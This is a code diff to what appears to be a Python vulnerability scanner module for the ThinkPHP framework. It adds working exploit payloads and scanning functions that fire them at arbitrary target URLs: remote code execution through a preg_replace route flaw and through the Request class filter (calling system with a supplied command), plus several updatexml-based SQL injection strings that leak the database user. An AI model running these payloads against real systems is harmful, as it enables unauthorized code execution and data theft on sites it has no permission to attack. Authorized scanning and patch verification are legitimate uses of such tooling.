@@ -3,10 +3,23 @@
 
 '''
     ThinkPHP扫描类: 
-        ThinkPHP5 未开启强制路由RCE
+        1. ThinkPHP5 未开启强制路由RCE
             CNVD-2018-24942
-        ThinkPHP5 核心类Request远程代码执行
+                Payload: https://bbs.zkaq.cn/t/5636.html
+
+        2. ThinkPHP5 核心类Request远程代码执行
             CNNVD-201901-445
+                Payload: https://bbs.zkaq.cn/t/5636.html
+
+        3. ThinkPHP2.x preg_replace函数使用不当RCE
+            暂无编号
+                Payload: https://vulhub.org/#/environments/thinkphp/2-rce/
+
+        4. ThinkPHP5 ids参数 sql注入漏洞
+            暂无编号
+                Payload: https://vulhub.org/#/environments/thinkphp/in-sqlinjection/
+
+其它奇奇怪怪的Payload: https://baizesec.github.io/
 '''
 
 from lib.initial.config import config
@@ -40,7 +53,7 @@ class ThinkPHP():
                 'data': ''
             },
             {
-                'path': 'index.php?s=index/\\think\\view\driver\Php/display&content={}'.format('<?php phpinfo();?>'),
+                'path': 'index.php?s=index/\\think\\view\driver\Php/display&content=<?php phpinfo();?>',
                 'data': ''
             }
         ]
@@ -49,6 +62,57 @@ class ThinkPHP():
             {
                 'path': 'index.php?s=captcha',
                 'data': '_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]={}'.format(self.cmd)
+            }
+        ]
+
+        self.thinkphp_2_x_rce_payloads = [
+            {
+                'path': 'index.php?s=/index/index/name/$%7B@phpinfo()%7D',
+                'data': ''
+            }
+        ]
+
+        self.thinkphp_5_ids_sqlinject_payloads = [
+            {
+                'path': 'index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1',
+                'data': ''
+            }
+        ]
+
+        # * 以下payload没有找到测试环境, 所以没写poc, 哪个好心人提供一下环境QAQ
+        self.thinkphp_5_options_sqlinject_payloads = [
+            {
+                'path': 'index?options=id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23 **',
+                'data': ''
+            },
+            {
+                'path': 'index?options=id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23',
+                'data': ''
+            }
+        ]
+
+        self.thinkphp_5_username_sqlinject_payloads = [
+            {
+                'path': 'index/index/index?username[0]=inc&username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&username[2]=1 ',
+                'data': ''
+            },
+            {
+                'path': '?username[0]=point&username[1]=1&username[2]=updatexml(1,concat(0x7,user(),0x7e),1)^&username[3]=0 ',
+                'data': ''
+            }
+        ]
+
+        self.thinkphp_5_orderby_sqlinject_payloads = [
+            {
+                'path': 'index/index/index?orderby[id`|updatexml(1,concat(0x7,user(),0x7e),1)%23]=1 ',
+                'data': ''
+            }
+        ]
+
+        self.thinkphp_5_include_payloads = [
+            {
+                'path': 'index/index/index?cacheFile=1.jpg',
+                'data': ''
             }
         ]
 
@@ -94,7 +158,7 @@ class ThinkPHP():
                 return None
 
             # * 判断扫描结果
-            if (self.md in check.check_res(res.text, self.md)) or ('PHP Version' in res.text):
+            if (self.md in check.check_res(res.text, self.md)) or (('PHP Version' in res.text) and ('PHP License' in res.text)):
                 results = {
                     'Target': target,
                     'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
@@ -161,10 +225,121 @@ class ThinkPHP():
                 }
                 return results
 
+    def thinkphp_2_x_rce_scan(self, url):
+        ''' ThinkPHP 2.x版本中, 使用preg_replace的/e模式匹配路由; 
+                导致用户的输入参数被插入双引号中执行, 造成任意代码执行漏洞; 
+                ThinkPHP 3.0版本因为Lite模式下没有修复该漏洞, 也存在这个漏洞
+        '''
+        vul_info = {}
+        vul_info['app_name'] = self.app_name
+        vul_info['vul_type'] = 'RCE'
+        vul_info['vul_id'] = 'thinkphp-2.x-rce'
+        vul_info['vul_method'] = 'GET'
+        vul_info['headers'] = {}
+
+        # headers = self.headers.copy()
+        # headers.update(vul_info['headers'])
+
+        for payload in self.thinkphp_2_x_rce_payloads:
+            path = payload['path']
+            data = payload['data']
+            target = url + path
+
+            vul_info['path'] = path
+            vul_info['data'] = data
+            vul_info['target'] = target
+
+            try:
+                res = requests.get(
+                    target, 
+                    timeout=self.timeout, 
+                    headers=self.headers,
+                    data=data, 
+                    proxies=self.proxies, 
+                    verify=False
+                )
+                logger.logging(vul_info, res.status_code, res)                        # * LOG
+            except requests.ConnectTimeout:
+                logger.logging(vul_info, 'Timeout')
+                return None
+            except requests.ConnectionError:
+                logger.logging(vul_info, 'Faild')
+                return None
+            except:
+                logger.logging(vul_info, 'Error')
+                return None
+
+            if (('PHP Version' in res.text) and ('PHP License' in res.text)):
+                results = {
+                    'Target': target,
+                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
+                    'Method': vul_info['vul_method'],
+                    'Payload': {
+                        'Url': url,
+                        'Path': path
+                    }
+                }
+                return results
+
+    def thinkphp_5_ids_sqlinject_scan(self, url):
+        ''' ThinkPHP5 SQL注入漏洞&&敏感信息泄露漏洞 '''
+        vul_info = {}
+        vul_info['app_name'] = self.app_name
+        vul_info['vul_type'] = 'SQLinject'
+        vul_info['vul_id'] = 'thinkphp-5-ids-sqlinject'
+        vul_info['vul_method'] = 'GET'
+        vul_info['headers'] = {}
+
+        # headers = self.headers.copy()
+        # headers.update(vul_info['headers'])
+
+        for payload in self.thinkphp_5_ids_sqlinject_payloads:
+            path = payload['path']
+            data = payload['data']
+            target = url + path
+
+            vul_info['path'] = path
+            vul_info['data'] = data
+            vul_info['target'] = target
+
+            try:
+                res = requests.get(
+                    target, 
+                    timeout=self.timeout, 
+                    headers=self.headers,
+                    data=data, 
+                    proxies=self.proxies, 
+                    verify=False
+                )
+                logger.logging(vul_info, res.status_code, res)                        # * LOG
+            except requests.ConnectTimeout:
+                logger.logging(vul_info, 'Timeout')
+                return None
+            except requests.ConnectionError:
+                logger.logging(vul_info, 'Faild')
+                return None
+            except:
+                logger.logging(vul_info, 'Error')
+                return None
+
+            if (('XPATH syntax error' in res.text) and ('Database Config' in res.text)):
+                results = {
+                    'Target': target,
+                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
+                    'Method': vul_info['vul_method'],
+                    'Payload': {
+                        'Url': url,
+                        'Path': path
+                    }
+                }
+                return results
+
     def addscan(self, url):
         return [
             thread(target=self.cnvd_2018_24942_scan, url=url),
-            thread(target=self.cnnvd_201901_445_scan, url=url)
+            thread(target=self.cnnvd_201901_445_scan, url=url),
+            thread(target=self.thinkphp_2_x_rce_scan, url=url),
+            thread(target=self.thinkphp_5_ids_sqlinject_scan, url=url)
         ]
 
 thinkphp = ThinkPHP()
